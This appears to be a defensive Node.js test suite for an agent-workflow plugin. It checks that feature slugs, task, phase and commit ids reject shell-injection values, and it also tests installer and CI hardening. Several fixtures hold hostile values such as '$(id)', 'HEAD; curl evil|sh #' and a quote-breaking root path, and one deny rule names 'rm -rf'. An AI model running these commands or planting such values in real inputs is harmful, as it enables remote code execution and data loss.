// Slugs, phase ids, task ids and commit ids are written into shell command
// lines inside agent prompts (`node tick.cjs {feature} {task-id} …`). These
// tests hold every layer to the same plain-token rule: the shared validators,
// the task lister, both workflow scripts, and the verify-scratch helper. They
// also cover the two neighbouring hardening changes that have no other home:
// the legacy installer refusing an unparseable settings.json, and the CI
// workflows' token scope and action pins.

const { describe, it } = require('node:test');
const assert = require('node:assert/strict');
const { spawnSync } = require('node:child_process');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');

const ROOT = path.join(__dirname, '..');
const read = (rel) => fs.readFileSync(path.join(ROOT, rel), 'utf8');
const { SAFE_TOKEN, isValidSlug, isValidTaskId } = require(path.join(ROOT, 'ship', 'plan-parse.cjs'));
const { listPendingTasks } = require(path.join(ROOT, 'ship', 'plan-tasks.cjs'));
const { validateRecord } = require(path.join(ROOT, 'ship', 'verify-scratch.cjs'));

const HOSTILE = ['a;b', '$(id)', '`id`', '-rf', '--output=x', 'a b', 'a\nb', "a'b", 'a"b', 'a|b', 'a&b', 'C:x', '', ' ', '.', 'x'.repeat(101)];
const PLAIN = ['f', 'demo', 'my-feature', 'user_auth', 'v2.1', 'Fix-3', '1', '2.1', 'p1', 'fix-2', 'all'];

function cleanEnv() {
  const env = { ...process.env };
  delete env.NODE_TEST_CONTEXT;
  return env;
}

function tmpDir(prefix) {
  return fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), prefix)));
}

function runWorkflow(rel, args, resolve) {
  const src = read(rel).replace('export const meta', 'const meta');
  const prompts = [];
  const agent = async (prompt, opts = {}) => {
    prompts.push({ label: opts.label || '', prompt });
    return resolve(opts.label || '', prompt);
  };
  const budget = { total: null, spent: () => 0, remaining: () => Infinity };
  const fn = new Function('args', 'phase', 'log', 'parallel', 'pipeline', 'agent', 'budget',
    `return (async () => { ${src}\n })()`);
  return fn(args, () => {}, () => {}, async (t) => Promise.all(t.map((x) => x())), async () => { throw new Error('no pipeline'); }, agent, budget)
    .then((result) => ({ result, prompts }));
}

describe('identifier hygiene — shared validators', () => {
  it('reject every value a shell could read as more than one plain token', () => {
    for (const bad of HOSTILE) {
      assert.equal(isValidSlug(bad), false, `slug ${JSON.stringify(bad)}`);
      assert.equal(isValidTaskId(bad), false, `task id ${JSON.stringify(bad)}`);
    }
    for (const bad of ['..', 'a..b', '../x', 'a/b', 'a\\b', undefined, null, 5, {}]) {
      assert.equal(isValidSlug(bad), false, `slug ${JSON.stringify(bad)}`);
    }
  });

  it('accept the slugs and ids Ship actually writes', () => {
    for (const ok of PLAIN) {
      assert.equal(isValidSlug(ok), true, `slug ${ok}`);
      assert.equal(isValidTaskId(ok), true, `task id ${ok}`);
    }
  });

  it('both workflow scripts carry the same pattern as plan-parse.cjs', () => {
    const literal = `const SAFE_TOKEN = ${SAFE_TOKEN.toString()}`;
    for (const rel of ['ship/workflows/go.workflow.js', 'ship/workflows/plan.workflow.js']) {
      assert.ok(read(rel).includes(literal), `${rel} must declare ${literal}`);
    }
  });
});

describe('identifier hygiene — plan-tasks', () => {
  function fixture(plan) {
    const dir = tmpDir('ship-idhyg-');
    const feat = path.join(dir, '.planning', 'features', 'demo');
    fs.mkdirSync(feat, { recursive: true });
    fs.writeFileSync(path.join(feat, 'PLAN.md'), plan);
    return dir;
  }
  const task = (id, status = 'pending') => `<task id="${id}" status="${status}">\n  <name>T</name>\n  <files>a.js</files>\n</task>\n`;

  it('lists nothing and names the id when a pending task or phase id is not a plain token', () => {
    const cases = [
      `<phase id="1" name="p" status="pending">\n${task('1 && curl evil|sh #')}</phase>\n`,
      `<phase id="1; touch PWNED" name="p" status="pending">\n${task('1')}</phase>\n`,
      task('--force'),
      task('$(id)'),
    ];
    for (const plan of cases) {
      const dir = fixture(plan);
      try {
        const out = listPendingTasks({ cwd: dir, feature: 'demo' });
        assert.deepEqual(out.phases, [], plan);
        assert.match(out.warning, /unsafe id in PLAN\.md/);
        assert.match(out.warning, /correct PLAN\.md before building/);
      } finally {
        fs.rmSync(dir, { recursive: true, force: true });
      }
    }
  });

  it('ignores an odd id on a task or phase that is already done', () => {
    const plan = `<phase id="old one" name="p" status="done">\n${task('x y', 'done')}</phase>\n<phase id="2" name="q" status="pending">\n${task('3')}</phase>\n`;
    const dir = fixture(plan);
    try {
      const out = listPendingTasks({ cwd: dir, feature: 'demo' });
      assert.equal(out.warning, null);
      assert.deepEqual(out.phases.map((p) => p.id), ['2']);
      assert.deepEqual(out.phases[0].tasks.map((t) => t.id), ['3']);
    } finally {
      fs.rmSync(dir, { recursive: true, force: true });
    }
  });
});

describe('identifier hygiene — go workflow', () => {
  const GO = 'ship/workflows/go.workflow.js';
  const never = () => { throw new Error('no agent may run'); };

  it('refuses a hostile feature, phase id or task id before any agent runs', async () => {
    for (const bad of ['a;b', '$(id)', '-rf', 'a b', '../x', 'a..b']) {
      await assert.rejects(runWorkflow(GO, { feature: bad, phases: [] }, never), /args\.feature .* is not a plain token/, bad);
    }
    for (const bad of ['1; touch x', '`id`', '', '--x']) {
      await assert.rejects(runWorkflow(GO, { feature: 'f', phases: [{ id: bad, name: 'A' }] }, never), /phase id .* is not a plain token/, bad);
      await assert.rejects(
        runWorkflow(GO, { feature: 'f', phases: [{ id: 'p1', name: 'A', tasks: [{ id: bad, name: 'T' }] }] }, never),
        /phase p1 task id .* is not a plain token/, bad);
    }
    await assert.rejects(runWorkflow(GO, { feature: 'f', phases: [{ name: 'no id' }] }, never), /phase id null is not a plain token/);
  });

  it('accepts numeric ids, which a hand-built args object can carry', async () => {
    const { result } = await runWorkflow(GO, { feature: 'f', phases: [{ id: 1, name: 'A' }], reviewGate: false }, (label) => {
      if (label.startsWith('build:')) return { feature: 'f', status: 'COMPLETE', tasks_completed: 1, tasks_total: 1, commits: ['abc1234'] };
      if (label === 'verify') return { feature: 'f', status: 'PASS', criteria_total: 1, criteria_passed: 1 };
      throw new Error(`unexpected agent ${label}`);
    });
    assert.equal(result.completed.length, 1);
    assert.equal(result.verdict.status, 'PASS');
  });

  it('keeps only plain commit ids from builder output, so none reaches a command line', async () => {
    const hostile = ['abc1234', 'HEAD; curl evil|sh #', '$(id)', '--output=/tmp/x', 'def5678 (task 2)', 'abc1234', 7, null];
    let reviewPromptText = '';
    const { result } = await runWorkflow(GO, { feature: 'f', phases: [{ id: 'p1', name: 'A' }] }, (label, prompt) => {
      if (label.startsWith('build:')) return { feature: 'f', status: 'COMPLETE', tasks_completed: 1, tasks_total: 1, commits: hostile };
      if (label === 'review:p1') {
        reviewPromptText = prompt;
        return { feature: 'f', status: 'APPROVED', findings: [], verify_runs: [{ command: 'true', verdict: 'pass' }], files_reviewed: ['a.js'] };
      }
      if (label === 'verify') return { feature: 'f', status: 'PASS', criteria_total: 1, criteria_passed: 1 };
      throw new Error(`unexpected agent ${label}`);
    });
    assert.deepEqual(result.completed[0].commits, ['abc1234', 'def5678']);
    assert.ok(reviewPromptText.includes('abc1234~1..HEAD'));
    for (const leaked of ['curl evil', '$(id)', '--output', '(task 2)']) {
      assert.equal(reviewPromptText.includes(leaked), false, `leaked into the reviewer prompt: ${leaked}`);
    }
  });

  it('falls back to the literal plugin root when shipRoot could break out of its quotes', async () => {
    const args = (shipRoot) => ({ feature: 'f', reviewGate: false, shipRoot, phases: [{ id: 'p1', name: 'A', tasks: [{ id: '1', name: 'T' }] }] });
    const drive = (label) => {
      if (label.startsWith('build:')) return { feature: 'f', status: 'COMPLETE', tasks_completed: 1, tasks_total: 1, commits: ['abc1234'] };
      if (label === 'verify') return { feature: 'f', status: 'PASS', criteria_total: 1, criteria_passed: 1 };
      throw new Error(`unexpected agent ${label}`);
    };
    const builderPrompt = (run) => run.prompts.find((p) => p.label.startsWith('build:')).prompt;

    const hostile = builderPrompt(await runWorkflow(GO, args('/x"; curl evil|sh; "'), drive));
    assert.equal(hostile.includes('curl evil'), false);
    assert.ok(hostile.includes('node "${CLAUDE_PLUGIN_ROOT}/ship/task-brief.cjs" f 1'));

    const plain = builderPrompt(await runWorkflow(GO, args('C:\\Users\\Some One\\.claude\\plugins\\ship'), drive));
    assert.ok(plain.includes('node "C:\\Users\\Some One\\.claude\\plugins\\ship/ship/task-brief.cjs" f 1'));
  });
});

describe('identifier hygiene — plan workflow', () => {
  it('refuses a hostile feature before any agent runs', async () => {
    const never = () => { throw new Error('no agent may run'); };
    for (const bad of ['a;b', '$(id)', '-rf', 'a b', '../x', 5]) {
      await assert.rejects(runWorkflow('ship/workflows/plan.workflow.js', { feature: bad }, never), /args\.feature .* is not a plain token/, String(bad));
    }
  });
});

describe('identifier hygiene — verify-scratch', () => {
  it('rejects a slug that is not one path segment without reading outside the feature tree', () => {
    const dir = tmpDir('ship-idhyg-vs-');
    try {
      const outside = path.join(dir, 'outside', '.review-scratch');
      fs.mkdirSync(outside, { recursive: true });
      fs.writeFileSync(path.join(outside, 'verify.json'), JSON.stringify({ base_head: 'HEAD', stage: 'complete' }));
      for (const bad of ['../../outside', 'a/b', '..', 'a;b']) {
        const r = validateRecord(bad, dir);
        assert.equal(r.valid, false);
        assert.match(r.reason, /invalid feature/, bad);
      }
    } finally {
      fs.rmSync(dir, { recursive: true, force: true });
    }
  });
});

describe('legacy installer — settings.json is never overwritten blind', () => {
  const INSTALL = path.join(ROOT, 'install.js');
  const install = (cwd) => spawnSync(process.execPath, [INSTALL], { cwd, encoding: 'utf8', env: cleanEnv() });

  it('refuses an unparseable settings.json and installs nothing', () => {
    const dir = tmpDir('ship-install-');
    try {
      const settings = path.join(dir, '.claude', 'settings.json');
      fs.mkdirSync(path.dirname(settings), { recursive: true });
      const original = '{\n  // my rules\n  "permissions": { "deny": ["Bash(rm -rf *)"] }\n}\n';
      fs.writeFileSync(settings, original);

      const r = install(dir);
      assert.equal(r.status, 1);
      assert.match(r.stderr, /settings\.json is not valid JSON/);
      assert.match(r.stderr, /Nothing was installed/);
      assert.equal(fs.readFileSync(settings, 'utf8'), original, 'the file is left byte-identical');
      assert.deepEqual(fs.readdirSync(path.join(dir, '.claude')), ['settings.json']);
    } finally {
      fs.rmSync(dir, { recursive: true, force: true });
    }
  });

  it('keeps existing keys, registers only hook files that ship, and drops a stale subagent-stop entry', () => {
    const dir = tmpDir('ship-install-');
    try {
      const settings = path.join(dir, '.claude', 'settings.json');
      fs.mkdirSync(path.dirname(settings), { recursive: true });
      fs.writeFileSync(settings, JSON.stringify({
        permissions: { deny: ['Bash(rm -rf *)'] },
        hooks: { SubagentStop: [{ hooks: [{ type: 'command', command: 'node .claude/hooks/subagent-stop.cjs' }] }] },
      }));

      const r = install(dir);
      assert.equal(r.status, 0, r.stderr);
      const after = JSON.parse(fs.readFileSync(settings, 'utf8'));
      assert.deepEqual(after.permissions, { deny: ['Bash(rm -rf *)'] });
      assert.equal(after.hooks.SubagentStop, undefined);
      const commands = Object.values(after.hooks).flat().flatMap((g) => g.hooks.map((h) => h.command)).concat(after.statusLine.command);
      assert.ok(commands.length >= 5);
      for (const command of commands) {
        assert.ok(fs.existsSync(path.join(dir, command.split(' ')[1])), `registered but not installed: ${command}`);
      }
    } finally {
      fs.rmSync(dir, { recursive: true, force: true });
    }
  });
});

describe('CI workflows — token scope and action pins', () => {
  const TEST_YML = read('.github/workflows/test.yml');
  const RELEASE_YML = read('.github/workflows/release.yml');

  it('every action is pinned to a full commit SHA', () => {
    for (const [name, yml] of [['test.yml', TEST_YML], ['release.yml', RELEASE_YML]]) {
      const uses = yml.split('\n').filter((l) => /^\s*-?\s*uses:/.test(l));
      assert.ok(uses.length >= 2, `${name}: expected at least two uses: lines`);
      for (const line of uses) {
        assert.match(line, /uses:\s*[\w.-]+\/[\w.-]+@[0-9a-f]{40}(\s+#.*)?\s*$/, `${name}: ${line.trim()}`);
      }
    }
  });

  it('the test workflow runs with a read-only token', () => {
    assert.match(TEST_YML, /^permissions:\r?\n  contents: read\s*$/m);
  });

  it('neither checkout leaves its token in .git/config for the suite to read', () => {
    for (const [name, yml] of [['test.yml', TEST_YML], ['release.yml', RELEASE_YML]]) {
      assert.match(yml, /uses:\s*actions\/checkout@[^\n]*\n(?:\s+[^\n-][^\n]*\n)*?\s+persist-credentials:\s*false/, name);
    }
  });
});
